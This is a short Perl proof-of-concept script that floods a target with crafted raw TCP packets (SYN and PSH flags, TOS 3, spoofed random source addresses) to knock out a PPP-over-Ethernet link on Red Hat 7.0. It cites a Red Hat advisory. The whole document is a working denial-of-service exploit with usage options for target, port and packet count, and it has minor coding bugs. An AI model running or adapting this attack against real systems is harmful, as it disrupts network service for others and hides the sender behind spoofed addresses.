#!/usr/bin/perl
# POC script that causes a DoS in an PPP-over-Ethernet Link, in RedHat 7.0.
# Advisory: http://www.redhat.com/support/errata/RHSA-2000-130.html
# by dethy
use Net::RawIP;
use Getopt::Std;
getopts('d:s:p:c',\%args) || &usage;
if(defined($args{d})){$daddr=$args{d};}else{&usage;}
if(defined($args{s})){$src=$args{s};}else{$src=&randsrc;}
if(defined($port{p})){$port=$args{p};}else{&usage;}
if(defined($args{c})){$count=$args{c};}else{$count=10;}

sub randport(){
 srand;
 return $sport=(int rand 65510); 
 }

sub randsrc(){
  srand; 
  return $saddr=(int rand 255).".".(int rand 255).".".(int rand 255).".".(int rand 255); 
 }

 $packet = new Net::RawIP({ip=>{},tcp=>{}});
 $packet->set({ ip => { saddr => $src, 
			daddr => $daddr, 
			tos => 3 },
               tcp => { source => $sport, 
			dest => $port,
                        syn => 1, psh => 1 } });

 $packet->send(0,$count);

sub usage(){ die("pppoe-link POC DoS on RH7\n$0 -d <dest> -s <source> -p <port> -c <count>\n"); }

